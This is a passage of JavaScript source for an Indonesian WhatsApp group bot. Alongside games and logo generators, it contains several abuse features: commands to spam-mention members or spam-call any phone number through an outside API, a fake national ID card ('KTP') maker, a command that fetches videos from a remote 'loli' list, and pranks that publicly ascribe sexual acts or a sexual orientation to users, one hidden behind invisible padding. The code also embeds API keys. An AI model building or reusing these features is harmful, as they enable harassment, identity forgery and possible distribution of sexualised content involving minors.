Sendbutdocument(from, tescok, "©Wa.me×Owner/alya*", fs.readFileSync('./media/Alya✓Bot.pdf'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./media/image/thumbnaildokumen.jpg'), filename:`Alya✓Bot.pdf`, pageCount: 9999999 }, [{buttonId:`!000`,buttonText:{displayText:'Hai‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n\nSemuanya aku mau Jujur Kalau aku itu Gay dan Lagi Pengen Sama Cowok berotot untuk jadi Pacarku, yang Berminat Bisa Chat aku yahh 😋'},type:1}], {quoted:foncevid, contextInfo: { mentionedJid: [ptod,stod], forwardingScore: 508, isForwarded: true, externalAdReply:{title:`${ucapanWaktu} - ${pushname}\nJangan Lupa Donasi Kak`,mediaType:"2",thumbnail:ofrply,mediaUrl:`https://youtu.be/x-O0WHkv3uc`}}})
break
case 'credits':
if (isBanned) return reply(mess.ban)
   dtod = '62858157008612'
   dtod1 = '6285751056816'
   dtod2 = '6285697725326'
   dtod3 = ''
   dtod4 ='0'
   var yez = `
   [ 𝐶𝑟𝑒𝑑𝑖𝑡𝑠 𝐵𝑦 ] :
   
 🌹 : wa.me/${dtod1.split("@")[0]}
 🌹 : wa.me/${dtod.split('@')[0]}
 🌹 : wa.me/${dtod2.split('@')[0]}
 🌹 : wa.me/${dtod3.split('@')[0]}
 🌹 : wa.me/${dtod4.split('@')[0]}
 `
     credit = ALIYABOT.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 1000, "message": `${yez}`, "footerText": "hehe", "thumbnail": iye, "surface": 'CATALOG'}}, {quoted: mek})
            ALIYABOT.relayWAMessage(credit)
        break
case 'tovn':
if (isBanned) return reply(mess.ban)
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})  
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await ALIYABOT.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						ALIYABOT.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
						fs.unlinkSync(mediam)
				break                                     
case "suit":
  if (isBanned) return reply(mess.ban)
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (!isRegistered) return reply(mess.ban)
  sendButMessage(from, `Pilih Gunting Kertas Atau Batu`, `Pilih salah satu button untuk bermain suit`, [
          {
            buttonId: `${prefix}sutit batu`,
            buttonText: {
              displayText: `BATU`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}sutit gunting`,
            buttonText: {
              displayText: `GUNTING`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}sutit kertas`,
            buttonText: {
              displayText: `KERTAS`,
            },
            type: 1,
          },
        ]);
        break
case 'sutit':
if (isBanned) return reply(mess.ban)
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (!isRegistered) return reply(mess.ban)
  if (args.length < 1) return reply('Pilih gunting/batu/kertas')
					if (args[0] === 'gunting' ) {
					  gunting = [
					    "Kamu *Gunting*\nAku *Kertas*\nKamu Menang 😔",
					    "Kamu *Gunting*\nAku *Batu*\nKamu Kalah 🙂",
					    "Kamu *Gunting*\nAku *Gunting*\nKita Seri 😏"
					    ]
					  gun = gunting[Math.floor(Math.random() * gunting.length)]
					  reply(gun)
					} else if (args[0] === 'kertas') {
					  ker = [
					    "Kamu *Kertas*\nAku *Batu*\nKamu Menang 😔",
					    "Kamu *Kertas*\nAku *Gunting*\nKamu Kalah 🙂",
					    "Kamu *Kertas*\nAku *Kertas*\nKita Seri 😏"
					    ]
					  kertas = ker[Math.floor(Math.random() * ker.length)]
						reply(kertas)
					} else if (args[0] === 'batu') {
					  bat = [
					    "Kamu *Batu*\nAku *Gunting*\nKamu Menang 😍",
					    "Kamu *Batu*\nAku *Kertas*\nKamu Kalah 🙂",
					    "Kamu *Batu*\nAku *Batu*\nKita Seri 😏"
					    ]
					  batu = bat[Math.floor(Math.random() * bat.length)]
					  reply(batu)
					} else {
					  reply('Pilih gunting/batu/kertas')
					}
break
case 'loliv':
       case 'lolivid':
       case 'lolivideo':
       if (isBanned) return reply(mess.ban)
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
              reply(mess.wait)
              anu = await fetchText('https://raw.githubusercontent.com/AlvioAdjiJanuar/random/main/loli.txt')
             .then(async (body) => {
              anu = body.split('\n')
              anu = anu[Math.floor(Math.random() * anu.length)]
              sendMediaURL(from, anu)
})
             .catch(async (err) => {
              console.error(err)
              reply(`${err}`)
})
              break
case 'bugreport':
if (isBanned) return reply(mess.ban)
              if (args.length < 1) return reply(`Ketik ${prefix}bugreport [fiturnya] [Error Nya Gimana]`) 
              teks = args.join(' ')
              grupinv('Terima Kasih Telah Melaporkan Bug Pada Owner, Jika Itu Sekedar Iseng Maka Akan Di Ban Oleh Bot!')
              ALIYABOT.sendMessage('62858157008613@s.whatsapp.net',`*Bug Report:* ${teks}`, text)
              
              break
case 'restart':
             if (!isOwner) return 
             reply(mess.wait)
             exec(`node main`)
             grupinv('_Restarting Bot Success_')
break
case 'ktp':
if (isBanned) return reply(mess.ban)
                    if (args.length == 0) return reply(`Usage: ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image\n\nContoh: ${prefix + command} 456127893132123|bumipertiwi|fatamorgana|Akira|mars, 99-99-9999|belum ditemukan|jl wardoyo|999/999|turese|imtuni|alhamdulillah islam|jomblo kack|mikirin dia|indo ori no kw|hari kiamat|https://i.ibb.co/Xb2pZ88/test.jpg`)
                    get_args = args.join(" ").split("|")
                    nik = get_args[0]
                    prov = get_args[1]
                    kabu = get_args[2]
                    name = get_args[3]
                    ttl = get_args[4]
                    jk = get_args[5]
                    jl = get_args[6]
                    rtrw = get_args[7]
                    lurah = get_args[8]
                    camat = get_args[9]
                    agama = get_args[10]
                    nikah = get_args[11]
                    kerja = get_args[12]
                    warga = get_args[13]
                    until = get_args[14]
                    img = get_args[15]
                    ini_anu = await getBuffer(`http://api.lolhuman.xyz/api/ktpmaker?apikey=SAYULONTEH&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=${img}`)
                    ALIYABOT.sendMessage(from, ini_anu, image, {quoted: mek, caption: 'Noh Jadi'})
                    break
case 'toxic':
if (isBanned) return reply(mess.ban)
              Toxic().then(toxic => {
              reply (toxic)
})
              break
              case 't':
       titid =  `SILAHKAN PILIH DI BAWAH UNTUK MELANJUTKAN`
          
                   sendButMessage(from, titid, `crated ℎ𝑒𝑟𝑚𝑎𝑛 𝐵𝑜𝑡𝑧☕︎`, [
          {
            buttonId: `Y`,
            buttonText: {
              displayText: `Y`,
            },
            type: 1,
            
            
    },
          {
            buttonId: `N`,
            buttonText: {
              displayText: `N`,
            },
            type: 1,
          },
        ]);
            
             
              break                         
                case 'quotesanime':
                if (isBanned) return reply(mess.ban)
                    quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${setting.lolkey}`)
                    quotes = quotes.result
                    quote = quotes.quote
                    char = quotes.character
                    anime = quotes.anime
                    episode = quotes.episode
                    reply(`_${quote}_\n\n*• ${char}*\n*• ${anime} ${episode}*`)
                    break
                case 'quotesdilan':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/quotes/diLan?apikey=${setting.lolkey}`)
                     reply(get_result.result)

                   break
                    break              
                case 'quotesimage':
                if (isBanned) return reply(mess.ban)
                    buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/${command}?apikey=IkyOgiwara`)
                    buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await ALIYABOT.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'MIKEL BOT', imageMessage: imageMsg,
              contentText: ini_txt,buttons,headerType:4}
              prep = await ALIYABOT.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              ALIYABOT.relayWAMessage(prep)
                 break
                 case 'spamtag':		
                 		if (isBanned) return reply(mess.ban)		
						if (isGroup && budy.length < 13) {
							teks = Number(args[0])
							teks1 = chan.message.extendedTextMessage.contextInfo.quotedMessage.conversation
							gmem = []
for (let o of groupMembers) {
	gmem.push(o.jid)
}
if (!Number(teks)) return reply('Jumlah harus berupa angka!')
if (Number(teks) >= 1000) return reply('Kebanyakan!')
	  for (let i = 0; i < teks; i++) {
	  ALIYABOT.sendMessage(from, teks1, MessageType.text, {contextInfo: {mentionedJid: gmem}})
	  }
			} else if (isGroup && budy.length > 13) {
teks = body.slice(9)
teks1 = teks.split('|')[0]
teks2 = teks.split('|')[1]
gmem = []
for (let o of groupMembers) {
	gmem.push(o.jid)
}
if (!teks1) teks1 = '-'
if (!Number(teks2)) return reply('Jumlah harus berupa angka!')
if (Number(teks2) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < teks2; i++) {
	  ALIYABOT.sendMessage(from, teks1, MessageType.text, {contextInfo: {mentionedJid: gmem}})
	  }
						} else if (!isGroup) {
							bodom = new RegExp('[-+/ +/()]', 'gi')
				bodo = body.slice(9)
						bodo1 = bodo.split('|')[0]
						bodo2 = bodo.split('|')[1]
				teks = bodo1.replace(bodom, '')
				orange = `${teks}@s.whatsapp.net`
		if (!Number(bodo2)) return reply('Jumlah harus berupa angka!')
if (Number(bodo2) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < bodo2; i++) {
	  ALIYABOT.sendMessage(from, `@${orange.split('@')[0]}`, MessageType.text, {contextInfo: {mentionedJid: [orange]}})
	  }
						}			
	  break
                 case 'spamcall':
                 if (isBanned) return reply(mess.ban)
  	if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length == 0) return reply(`Masukkan Nomer nya\ncontoh ${prefix}spamcall 0882XXX`)
			call = `${body.slice(11)}`
			anu = await fetchJson(`https://api.caliph71.xyz/api/spamcall?no=${call}&apikey=cq9j7Nma`, {method: 'get'})
			ALIYABOT.sendMessage(from, `${anu.result.logs}`, text, {quoted: mek})
			reply("Spam Message Succes Terkirim")
			break
			case 'tahta':
			if (isBanned) return reply(mess.ban)
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
				if (!isRegistered) return reply(mess.ban)
				dapuhy = body.slice(7)
				reply("loading.....")
				asu = await getBuffer(`https://api.zeks.xyz/api/hartatahta?text=${dapuhy}&apikey=apivinz`)
				ALIYABOT.sendMessage(from, asu, image, {quoted: mek})
				break
				case "ngewe":
				if (isBanned) return reply(mess.ban)
            if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					jds = []
					const jdiid = groupMembers
					const kosst = groupMembers
					const akuut = jdiid[Math.floor(Math.random() * jdiid.length)]
					const diaat = kosst[Math.floor(Math.random() * kosst.length)]
					teks = `Yang ngewe kemarin di grub ini adalah @${akuut.jid.split('@')[0]} dan️ @${diaat.jid.split('@')[0]} `
					jds.push(akuut.jid)
					jds.push(diaat.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break	
               case "bisakah":
               if (isBanned) return reply(mess.ban)
                  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
                  if (!isRegistered) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw
              
					bisakah = args.join(" ")
					const bisa =['Bisa','Tidak Bisa','Hmmm gimana ya','Gak bisa ajg awoakwok','mana mungkin su','Bisa banget tuh, keren kayaknya']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					ALIYABOT.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "kapankah":
		              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
		              if (!isRegistered) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw

                
					kapankah = args.join(" ")
					const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					ALIYABOT.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "apakah":
		              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
		              if (!isRegistered) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw

                 
					apakah = args.join(" ")
					const apa =['Iya','Tidak','Bisa Jadi','Hmmm gimana ya']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					ALIYABOT.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: mek })
					await limitAdd(sender)
					break
case "belah":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (!isRegistered) return reply(mess.ban)
					// ⚠️ Case by Arasya
                 
				if (args.length < 1) return reply('mana pertanyaan nya kak?\nContoh #iyas bermain Free Fire')
					iyas = args.join(" ")
					const iya =['Bener','Salah','Bener dong','Salah!!!']
					const salah = iya[Math.floor(Math.random() * iya.length)]
					ALIYABOT.sendMessage(from, 'Pertanyaan : *bener atau salah '+iyas+'*\n\nJawaban : '+ salah, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "bagaimanakah":
		              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
		              if (!isRegistered) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw

                 
					bagaimanakah = args.join(" ")
					const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Hmmm gimana ya','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan']
					const mana = bagai[Math.floor(Math.random() * bagai.length)]
					ALIYABOT.sendMessage(from, 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "rate":
		              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
		              if (!isRegistereded) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw

                 
					rate = args.join(" ")
					const ra =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
					ALIYABOT.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
                    case "sangecek":
                      if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					// ⚠️ Case by DappaUhuy&YogPw
if (!isRegistered) return reply(mess.ban)
                 
					sange = args.join(" ")
					const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const nge = sang[Math.floor(Math.random() * sang.length)]
					ALIYABOT.sendMessage(from, 'Pertanyaan : *'+sange+'*\n\nJawaban : '+ nge+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
case "gaycek":
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
  if (!isRegistered) return reply(mess.ban)
					// ⚠️ Case by DappaUhuy&YogPw
              
					gayy = args.join(" ")
					const gay =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const yag = gay[Math.floor(Math.random() * gay.length)]
					ALIYABOT.sendMessage(from, 'Pertanyaan : *'+gayy+'*\n\nJawaban : '+ yag+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
				case "jadian":
				if (isBanned) return reply(mess.ban)
				  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
					jds = []
					const jdii = groupMembers
					const koss = groupMembers
					const akuu = jdii[Math.floor(Math.random() * jdii.length)]
					const diaa = koss[Math.floor(Math.random() * koss.length)]
					teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]} ♥️ @${diaa.jid.split('@')[0]} `
					jds.push(akuu.jid)
					jds.push(diaa.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break
					case 'ytsilver':
					if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} ALIYABOT*`)
                   F = body.slice(10)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/splaybutton?text=${F}&apikey=${zeksApikey}`)
                   ALIYABOT.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break
				case 'wolf':
				if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} ALIYABOT*`)
                   F = body.slice(6)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/wolflogo?apikey=${zeksApikey}&text1=zeeoneofc&text2=${F}`)
                   ALIYABOT.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it?`, quoted: mek})
                   break
                case 'phcomment':
                if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} ALIYABOT&lol*`)
                   var F = body.slice(10)
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/phub?apikey=${zeksApikey}&img=https://1.bp.blogspot.com/-x8KhcOBG-yw/XiU4pi1yWVI/AAAAAAAADBA/gK8tsLyc1lQ808A348IKzDCjf6fUBKONwCLcBGAsYHQ/s1600/cara%2Bbuat%2Bfoto%2Bprofil%2Bdi%2Bwhatsapp%2Bmenjadi%2Bunik.jpg&username=${F1}&msg=${F2}`)
                  ALIYABOT.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nhow is it?`, quoted: mek})
                   break                           
         case 'tfire':  
         if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} ALIYABOT*`)
                   F = body.slice(7)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/tfire?text=${F}&apikey=${zeksApikey}`)                   
                   ALIYABOT.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break             
       case 'ytgol':  
       if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} ALIYABOT*`)
                   F = body.slice(8)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/gplaybutton?text=${F}&apikey=${zeksApikey}`)
                   ALIYABOT.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break       
       case 't3d':
       if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} ALIYABOT*`)
                   F = body.slice(5)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/text3dbox?apikey=${zeksApikey}&text=${F}`)
                   ALIYABOT.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break
       case 'logoa':
       if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} ALIYABOT&lol*`)
                   var F = body.slice(7)
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/logoaveng?text1=${F1}&text2=${F2}&apikey=${zeksApikey}`)
                   ALIYABOT.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break
       case 'phlogo':
       if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} ALIYABOT&lol*`)
                   var F = body.slice(9)
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/phlogo?text1=${F1}&text2=${F2}&apikey=${zeksApikey}`)
                   ALIYABOT.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break
       case 'marvel':
       if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} ALIYABOT&lol*`)
                   var F = body.slice(8)
				   var F1 = F.split("|")[0];
				   var F2 = F.split("|")[1]; 
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/marvellogo?text1=${F1}&text2=${F2}&apikey=${zeksApikey}`)
                   ALIYABOT.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break
       case 'leavest':  
       if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} ALIYABOT*`)
                   F = body.slice(9)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/leavest?text=${F}&apikey=${zeksApikey}`)
                   ALIYABOT.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break                   
       case 'notewrite':
       if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} ALIYABOT*`)
                   F = body.slice(7)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/nulis?text=${F}&apikey=${zeksApikey}`)
                   ALIYABOT.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break
       case 'neon2':
       if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} ALIYABOT*`)
                   F = body.slice(7)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/bneon?apikey=${zeksApikey}&text=${F}`)
                   ALIYABOT.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it? `, quoted: mek})
                   break                   
       case 'wall':
       if (isBanned) return reply(mess.ban)
                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} ALIYABOT*`)
                   F = body.slice(6)
                   reply(mess.wait)
                   anu = await getBuffer(`${ApiZeks}/api/breakwall?apikey=${zeksApikey}&text=${F}`)
                   ALIYABOT.sendMessage(from, anu, image, {thumbnail: Buffer.alloc(0),caption: `OK it's done\n\nHow is it?q`, quoted: mek})
                   break   	
                 case 'bucin':
                    case 'quotebucin':
                    if (isBanned) return reply(mess.ban)
                      if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})    
                    hasil = bucinrandom[Math.floor(Math.random() * (bucinrandom.length))]
                    ALIYABOT.sendMessage(from, '*'+hasil+'*', text, {quoted: mek})
            break
            case 'setppgrup':
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
   if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
   if (isQuotedImage) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
   let media = await ALIYABOT.downloadMediaMessage(encmedia)
   ALIYABOT.updateProfilePicture(from, media)
  .then((res) => reply(jsonformat(res)))
  .catch((err) => reply(jsonformat(err)))
   } else if (isQuotedSticker){
   if (mek.message.videoMessage) return grupinv('Error Bro Wkwkwk')
   encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
   media = await ALIYABOT.downloadAndSaveMediaMessage(encmedia)
   ran = getRandom('.png')
   exec(`ffmpeg -i ${media} ${ran}`, (err) => {
   fs.unlinkSync(media)
   if (err) return grupinv('Gagal, hehehe')
   buffer = fs.readFileSync(ran)
   ALIYABOT.updateProfilePicture(from, buffer)
   fs.unlinkSync(ran)
   })
   } else {
   reply(`Kirim atau tag gambar/sticker dengan caption ${prefix}setppgrup ya sayang 💕`)
   }
   break
case 'tutuptime':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (!isGroup) return grupinv(mess.only.group)
if (!isGroupAdmins) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
var nomor = mek.participant
ALIYABOT.groupSettingChange (from, GroupSettingChange.messageSend, true);
}, timer)
break
case 'bukatime':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (!isGroup) return grupinv(mess.only.group)
if (!isGroupAdmins) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
var nomor = mek.participant
ALIYABOT.groupSettingChange (from, GroupSettingChange.messageSend, false);
}, timer)
break
case 'maker3d': 
if (isBanned) return reply(mess.ban)
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} ALIYABOT`)
					makell = body.slice(8)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					ALIYABOT.sendMessage(from, buffer1, image, {quoted: mek, thumbnail: fs.readFileSync('./alya.jpg')})
					break
					case 'throne': 
if (args.length < 1) return reply('*Where is the text??*') 
tahta = args.join(" ")
reply(mess.wait)
tahta = await getBuffer(`https://api.zeks.me/api/hartatahta?text=${tahta}&apikey=apivinz`)
ALIYABOT.sendMessage(from, tahta, image, { quoted:mek,caption:'Here you go' })
break
case 'pubg': 
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
pubg = args.join(" ")
reply(mess.wait)
pubg = await getBuffer(`https://api.zeks.me/api/pubglogo?text1=PUBG&text2=${pubg}&apikey=apivinz`)
ALIYABOT.sendMessage(from, pubg, image, { quoted:mek,caption:'Here you go' })
break
case 'smoke': 
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
smoke = args.join(" ")
reply(mess.wait)
smoke = await getBuffer(`https://api.zeks.me/api/smoketext?text=${smoke}&apikey=apivinz`)
ALIYABOT.sendMessage(from, smoke, image, { quoted:mek,caption:'Here you go' })
break
case 'bneon': 
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
bneon = args.join(" ")
reply(mess.wait)
bneon = await getBuffer(`https://api.zeks.me/api/bneon?apikey=apivinz&text=${bneon}`)
ALIYABOT.sendMessage(from, bneon, image, { quoted:mek,caption:'Here you go' })
break
case 'matrix': 
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
matrix = args.join(" ")
reply(mess.wait)
matrix = await getBuffer(`https://api.zeks.me/api/matrix?apikey=apivinz&text=${matrix}`)
ALIYABOT.sendMessage(from, matrix, image, { quoted:mek,caption:'Here you go' })
break
